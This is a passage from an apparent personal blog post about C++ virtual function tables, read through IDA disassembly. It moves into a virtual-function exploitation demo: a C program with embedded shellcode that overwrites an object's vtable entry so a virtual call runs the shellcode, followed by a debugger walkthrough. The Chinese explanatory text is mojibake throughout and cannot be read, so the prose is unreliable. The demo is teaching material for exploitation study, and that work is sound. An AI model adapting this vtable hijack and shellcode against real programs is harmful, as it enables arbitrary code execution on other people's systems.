<p>ç¬¬äºŒä¸ªè™šå‡½æ•°,ä¸func1è™šå‡½æ•°çš„ä¸»è¦åŒºåˆ«æ˜¯,å­ç±»é‡å†™äº†func1,ä½†æ˜¯æ²¡æœ‰é‡å†™func2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:006410EF push    6</span><br><span class="line">.text:006410F1 push    5</span><br><span class="line">.text:006410F3 mov     ecx, [ebp+handle];ecxä¸­æ˜¯å¯¹è±¡çš„åœ°å€</span><br><span class="line">.text:006410F6 mov     edx, [ecx];edxæ˜¯å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—</span><br><span class="line">.text:006410F8 mov     ecx, [ebp+handle];ecxæ˜¯å¯¹è±¡çš„åœ°å€</span><br><span class="line">.text:006410FB mov     eax, [edx+4];å¯¹è±¡çš„ç¬¬ä¸€ä¸ªåŒå­—çš„å€¼åŠ ä¸Š4,ä¹Ÿå°±æ˜¯è™šå‡½æ•°è¡¨åç§»4</span><br><span class="line">.text:006410FE call    eax</span><br></pre></td></tr></table></figure>
<p><code>&amp;vtable+4=vtable[1]</code></p>
<p>ç›¸å½“äºè°ƒç”¨äº†<code>vtable[1]</code>ä¸Šé¢å­˜æ”¾çš„å‡½æ•°</p>
<h3 id="handle-func3">handle-&gt;func3();</h3>
<p>æ™®é€šçš„æˆå‘˜å‡½æ•°,ä½†æ˜¯è¯¥å‡½æ•°è¢«å­ç±»é‡è½½è¿‡,</p>
<p>ç”±äºå¯¹è±¡çš„æŒ‡é’ˆæ˜¯çˆ¶ç±»æŒ‡é’ˆ,å› æ­¤è¿™é‡Œä¼šè°ƒç”¨çˆ¶ç±»çš„func3å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00641100 mov     ecx, [ebp+handle] ; this</span><br><span class="line">.text:00641103 call    ?func3@A@@QAEXXZ ; A::func3(void)</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ååˆ†æ»´ç®€å•</p>
<p>æ ¹æ®stdcallè°ƒç”¨çº¦å®š,ecxä¸­æ”¾ä¸Šå¯¹è±¡åœ°å€,ç„¶åå°±ç›´æ¥è°ƒç”¨æˆå‘˜å‡½æ•°äº†</p>
<p>ä¸ºäº†åŒºåˆ†å­ç±»å‡½æ•°å’Œçˆ¶ç±»å‡½æ•°,vc++ç¼–è¯‘å™¨ç»™çˆ¶ç±»çš„func3å‡½æ•°å‘½åä¸º<code>?func3@A@@QAEXXZ</code></p>
<p>è¿™æ˜¯åœ¨ç¼–è¯‘é“¾æ¥çš„æ—¶å€™å°±å†™æ­»äº†çš„</p>
<h3 id="ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢">ä¸ºä»€ä¹ˆè¦æœ‰è™šè¡¨å‘¢?</h3>
<p>è™šè¡¨èµ·ç å¯ä»¥æ˜¯åœ¨ç¼–è¯‘é“¾æ¥é˜¶æ®µå¯ä»¥å†³å®šçš„,ä¸ºäº†è®©è¿è¡Œæ—¶éœ€è¦åšçš„äº‹æƒ…å°½å¯èƒ½å°‘,åº”è¯¥å­˜åœ¨è™šè¡¨è¿™ä¸ªä¸œè¥¿</p>
<p>è™šè¡¨ä¸èƒ½ç›´æ¥æ”¾åˆ°å¯¹è±¡é‡Œé¢å—?ä¸èƒ½</p>
<p>ä¸€æ˜¯å› ä¸º,ä¸€ç§ç±»å‹çš„æ‰€æœ‰å¯¹è±¡,å…±ç”¨ä¸€ä¸ªè™šè¡¨,å› æ­¤åœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­åªä¿ç•™ä¸€ä¸ªè™šè¡¨å°±å¤Ÿäº†,è¿™æœ‰ç‚¹ç±»ä¼¼äºå…±äº«åº“çš„ç¼©å½±.</p>
<p>äºŒæ˜¯å› ä¸º,å¦‚æœæŠŠè™šå‡½æ•°çš„åœ°å€ç›´æ¥æ”¾åˆ°å¯¹è±¡é‡Œé¢,ä¼šå¯¼è‡´å¯¹è±¡è‡ƒè‚¿.</p>
<p>ç°åœ¨åœ¨å¯¹è±¡é‡Œé¢åªä¿ç•™ä¸€ä¸ªè™šè¡¨æŒ‡é’ˆ,åªä¼šç»™å¯¹è±¡å¢åŠ 4ä¸ªå­—èŠ‚çš„ç©ºé—´,å·²ç»ç®—æ˜¯æœ€åˆç†çš„è®¾è®¡äº†</p>
<h2 id="è°ƒç”¨å’Œ.è°ƒç”¨"><code>-&gt;</code>è°ƒç”¨å’Œ<code>.</code>è°ƒç”¨</h2>
<p>å¯¹è±¡.æˆå‘˜å‡½æ•°,è¿™ç§è°ƒç”¨æ–¹å¼ä¸ä¼šè§¦å‘å¤šæ€,ä¸ä¼šè®¿é—®è™šå‡½æ•°è¡¨,å­ç±»å°±è°ƒç”¨å­ç±»é‡å†™çš„æˆå‘˜å‡½æ•°,æ²¡æœ‰é‡å†™åˆ™è°ƒç”¨çˆ¶ç±»çš„</p>
<p>æŒ‡é’ˆ-&gt;æˆå‘˜å‡½æ•°,è¿™ç§è°ƒç”¨æ–¹å¼ä¼šè§¦å‘å¤šæ€,é€šè¿‡è™šå‡½æ•°è¡¨å†³å®šæ‰§è¡Œå“ªä¸ªå‡½æ•°</p>
<p>åŒæ ·çš„ç¨‹åº,ä½¿ç”¨å¯¹è±¡.è¿™ç§è°ƒç”¨æ–¹å¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	B b;</span><br><span class="line">    b.func1();</span><br><span class="line">    b.func2(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">    b.func3();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Šæ ¹æœ¬æ²¡æœ‰è®¿é—®è™šè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mov     eax, offset off_4D71D0</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func1Ev  ; B::func1(void);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     dword ptr [esp+4], 6 ; int</span><br><span class="line">mov     dword ptr [esp], 5 ; this</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1A5func2Eii ; A::func2(int,int);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">sub     esp, 8</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func3Ev  ; B::func3(void);å†™æ­»çš„è®¿é—®å“ªä¸ªå‡½æ•°</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="è™šå‡½æ•°æ¼æ´">è™šå‡½æ•°æ¼æ´</h2>
<h3 id="è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ">è™šè¡¨æŒ‡é’ˆä¸è™šå‡½æ•°æŒ‡é’ˆ</h3>
<p>virtualä¿®é¥°çš„æˆå‘˜å‡½æ•°,è™šå‡½æ•°</p>
<p>è™šå‡½æ•°çš„å…¥å£åœ°å€ç»Ÿä¸€çš„ä¿å­˜åœ¨è™šè¡¨ä¸­</p>
<p>å¯¹è±¡è°ƒç”¨è™šå‡½æ•°æ—¶é¦–å…ˆé€šè¿‡<strong>è™šè¡¨æŒ‡é’ˆ</strong>æ‰¾åˆ°è™šè¡¨,ç„¶åä»è™šè¡¨ä¸­å–å‡ºè™šå‡½æ•°åœ°å€,ç„¶åcall</p>
<p>è™šè¡¨æŒ‡é’ˆä¿å­˜åœ¨å¯¹è±¡çš„å†…å­˜ç©ºé—´,ç´§æ¥ç€è™šè¡¨æŒ‡é’ˆçš„æ˜¯å…¶ä»–æˆå‘˜å˜é‡</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920225443155.png"
alt="image-20220920225443155" />
<figcaption aria-hidden="true">image-20220920225443155</figcaption>
</figure>
<p>å¦‚ä½•æ”»å‡»è¿™ä¸ªæœºåˆ¶å‘¢?</p>
<p>è¿™æ˜¯æœ¬æ¥çš„çŠ¶æ€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222434821.png"
alt="æœ¬æ¥çŠ¶æ€" />
<figcaption aria-hidden="true">æœ¬æ¥çŠ¶æ€</figcaption>
</figure>
<p>å¯ä»¥ä¿®æ”¹å¯¹è±¡å¤´4ä¸ªå­—èŠ‚çš„è™šè¡¨åœ°å€,æ”¹æˆå‡çš„è™šè¡¨åœ°å€,è¿™ä¸ªå‡è™šè¡¨ä¸Šç»´æŠ¤ç€shellcodeçš„åœ°å€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222852145.png"
alt="ä¿®æ”¹è™šè¡¨æŒ‡é’ˆ" />
<figcaption aria-hidden="true">ä¿®æ”¹è™šè¡¨æŒ‡é’ˆ</figcaption>
</figure>
<p>è¿˜å¯ä»¥ä¿æŒè™šè¡¨æŒ‡é’ˆä¸å˜,ä¿®æ”¹è™šè¡¨ä¸­çš„å‡½æ•°åœ°å€</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923225918430.png"
alt="ä¿®æ”¹è™šå‡½æ•°åœ°å€" />
<figcaption aria-hidden="true">ä¿®æ”¹è™šå‡½æ•°åœ°å€</figcaption>
</figure>
<h3 id="å­˜åœ¨æ¼æ´çš„ä»£ç ">å­˜åœ¨æ¼æ´çš„ä»£ç </h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>æ¯ä¸ªFailwestå‡½æ•°çš„æœ€åˆå››ä¸ªå­—èŠ‚,åœ¨bufä¹‹å‰,éƒ½æ˜¯è™šè¡¨æŒ‡é’ˆ,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x1C\x88\x40\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">	p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>overflowæ˜¯å…¨å±€ä½ç½®å®šä¹‰çš„ä¸€ä¸ªFailwestå¯¹è±¡,ä»–æœ‰ä¸€ä¸ªæˆå‘˜å˜é‡æ•°ç»„char
buf[200],è¿˜æœ‰ä¸€ä¸ªè™šå‡½æ•°test</p>
<p>é€šè¿‡ä¿®æ”¹è™šå‡½æ•°è¡¨ä¸­è™šå‡½æ•°çš„åœ°å€å°±å¯ä»¥è®©p-&gt;test()è¿™ç§è°ƒç”¨æ–¹å¼ä¸Šå½“</p>
<p>è™šå‡½æ•°è¡¨æŒ‡é’ˆä½äºå¯¹è±¡çš„ç¬¬ä¸€ä¸ªæˆå‘˜ä¹‹å‰4ä¸ªå­—èŠ‚,å› æ­¤ä¸€å¼€å§‹</p>
<p><code>char *p_vtable=overflow.buf-4</code>æ­¤æ—¶p_vtableæŒ‡é’ˆå’Œoverflow.bufçš„è™šè¡¨æŒ‡é’ˆæŒ‡å‘åŒä¸€å—åœ°å€äº†</p>
<p>ç”±äºoverflowå¯¹è±¡åªæœ‰ä¸€ä¸ªè™šå‡½æ•°,å› æ­¤è™šè¡¨ä¸€å¼€å§‹å°±æ˜¯è¯¥è™šå‡½æ•°çš„å®é™…åœ°å€.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™å°±å°†è¯¥è™šå‡½æ•°çš„åœ°å€ä¿®æ”¹ä¸º0x004088CC,è¿™é‡Œæ°å¥½æ˜¯shellcodeçš„é¦–åœ°å€(éœ€è¦è°ƒè¯•ç¡®å®š)</p>
<p>ç„¶åp=&amp;overflow,pæŒ‡é’ˆæŒ‡å‘overflowå¯¹è±¡</p>
<p>é€šè¿‡æŒ‡é’ˆè°ƒç”¨å¯¹è±¡çš„è™šå‡½æ•°,éœ€è¦å»æŸ¥è™šå‡½æ•°è¡¨,åº”è¯¥è°ƒç”¨å“ªä¸€ä¸ªå‡½æ•°,è€Œè™šå‡½æ•°è¡¨ç›¸åº”ä½ç½®çš„å‡½æ•°åœ°å€å·²ç»è¢«ä¿®æ”¹ä¸ºshellcodeçš„åœ°å€.</p>
<p>p-&gt;test()æœ¬æ¥åº”è¯¥æ˜¯æ‰§è¡Œoverflowçš„ç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªè™šå‡½æ•°,ä½†æ‰§è¡Œäº†shellcode</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿ">è°ƒè¯•è§‚å¯Ÿ</h3>
<p>è¿™ä¸ªç¨‹åºåœ¨win11,winXP,win2kä¸Šéƒ½å¯ä»¥å¼¹çª—,ç›´æ¥åœ¨win11ä¸Šç”¨idaåˆ†æ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:00401050 push    esi</span><br><span class="line">.text:00401051 push    edi</span><br><span class="line">.text:00401052 mov     edi, offset shellcode</span><br><span class="line">.text:00401057 or      ecx, 0FFFFFFFFh</span><br><span class="line">.text:0040105A xor     eax, eax</span><br><span class="line">.text:0040105C mov     byte ptr overflow_vtable, 0CCh</span><br><span class="line">.text:00401063 repne scasb</span><br><span class="line">.text:00401065 not     ecx</span><br><span class="line">.text:00401067 sub     edi, ecx</span><br><span class="line">.text:00401069 mov     byte ptr overflow_vtable+1, 88h</span><br><span class="line">.text:00401070 mov     eax, ecx</span><br><span class="line">.text:00401072 mov     esi, edi</span><br><span class="line">.text:00401074 mov     edi, offset overflow_buf</span><br><span class="line">.text:00401079 mov     byte ptr overflow_vtable+2, 40h ; &#x27;@&#x27;</span><br><span class="line">.text:00401080 shr     ecx, 2</span><br><span class="line">.text:00401083 mov     byte ptr overflow_vtable+3, 0</span><br><span class="line">.text:0040108A rep movsd</span><br><span class="line">.text:0040108C mov     ecx, eax</span><br><span class="line">.text:0040108E and     ecx, 3</span><br><span class="line">.text:00401091 rep movsb</span><br><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable</span><br><span class="line">.text:0040109E mov     p, ecx</span><br><span class="line">.text:004010A4 call    dword ptr [edx]</span><br><span class="line">.text:004010A6 pop     edi</span><br><span class="line">.text:004010A7 pop     esi</span><br><span class="line">.text:004010A8 retn</span><br><span class="line">.text:004010A8 _main endp</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>mov     byte ptr overflow_vtable, 0CCh</code>ä¿®æ”¹è™šå‡½æ•°åœ°å€ä¹‹å‰,çœ‹çœ‹æ­¤æ—¶overflow_vtableä¸Šæ”¾ç€çš„å®é™…çš„è™šå‡½æ•°åœ°å€æ˜¯è°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:00408818 overflow_vtable dd 4070C0h              ; DATA XREF: sub_401010â†‘w</span><br><span class="line">.data:00408818                                         ; _main+Câ†‘w ...</span><br></pre></td></tr></table></figure>
<p>è¯¥è™šå‡½æ•°çš„å®é™…åœ°å€æ˜¯0x4070C0</p>
<p>åˆ°è¿™é‡Œçœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004070C0 off_4070C0 dd offset sub_401020         ; DATA XREF: sub_401010â†‘o</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆæ˜¯ä¸€ä¸ªåœ°å€,å»sub_401020çœ‹çœ‹</p>
<p>thiscallè°ƒç”¨çº¦å®šä¸­ecxç”¨æ¥ä¼ é€’thisæŒ‡é’ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401020 sub_401020 proc near                    ; DATA XREF: .rdata:off_4070C0â†“o</span><br><span class="line">.text:00401020 push    offset aClassVtableTes          ; &quot;Class Vtable::test()&quot;</span><br><span class="line">.text:00401025 mov     ecx, offset dword_4088F0        ; this</span><br><span class="line">.text:0040102A call    ??6ostream@@QAEAAV0@PBD@Z       ; ostream::operator&lt;&lt;(char const *)</span><br><span class="line">.text:0040102F push    offset sub_4010D0</span><br><span class="line">.text:00401034 push    0Ah                             ; int</span><br><span class="line">.text:00401036 mov     ecx, eax                        ; this</span><br><span class="line">.text:00401038 call    ??6ostream@@QAEAAV0@E@Z         ; ostream::operator&lt;&lt;(uchar)</span><br><span class="line">.text:0040103D mov     ecx, eax</span><br><span class="line">.text:0040103F call    sub_4010B0</span><br><span class="line">.text:00401044 retn</span><br><span class="line">.text:00401044 sub_401020 endp</span><br></pre></td></tr></table></figure>
<p>è™šå‡½æ•°åœ°å€ä¿®æ”¹å®Œæ¯•,shellcodeä¹Ÿå†™å…¥å®Œæ¯•äº†,æ­¤æ—¶è¦è°ƒç”¨è™šå‡½æ•°äº†,ä¸”çœ‹è¿™é‡Œçš„æ±‡ç¼–æŒ‡ä»¤æ˜¯å•¥æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00401093 mov     edx, overflow_vtable</span><br><span class="line">.text:00401099 mov     ecx, offset overflow_vtable;è®¾ç½®thisæŒ‡é’ˆ</span><br><span class="line">.text:0040109E mov     p, ecx;æ— æ„ä¹‰</span><br><span class="line">.text:004010A4 call    dword ptr [edx];è§£å¼•ç”¨,è°ƒç”¨è™šå‡½æ•°è¡¨çš„ç¬¬ä¸€ä¸ªå‡½æ•°</span><br></pre></td></tr></table></figure>
<p>å•æ­¥æ­¥å…¥è¿™ä¸ªcallå°±åˆ°äº†shellcodeåŒºåŸŸäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data:0040881C overflow_buf:                           ; DATA XREF: _main+24â†‘o</span><br><span class="line">.data:0040881C cld</span><br><span class="line">.data:0040881D push    1E380A6Ah</span><br><span class="line">.data:00408822 push    4FD18963h</span><br><span class="line">.data:00408827 push    0C917432h</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/impossible/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/10/">10</a><a class="extend next" rel="next" href="/impossible/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
